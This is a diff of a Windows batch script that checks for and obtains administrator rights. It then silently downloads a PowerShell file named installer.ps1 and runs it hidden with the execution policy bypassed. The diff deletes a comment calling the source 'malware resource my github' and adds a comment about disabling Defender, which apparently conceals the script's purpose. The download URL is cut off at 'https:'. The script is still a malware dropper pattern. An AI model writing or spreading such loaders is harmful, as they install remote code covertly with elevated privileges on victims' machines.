@@ -1,7 +1,5 @@
-REM get admin premesions for script
 @echo off
 
-REM > check premessions
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
     >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) else (
@@ -25,7 +23,7 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
+REM disable defender
 
-REM malware resource my github
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https: -Outfile installer.ps1"
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
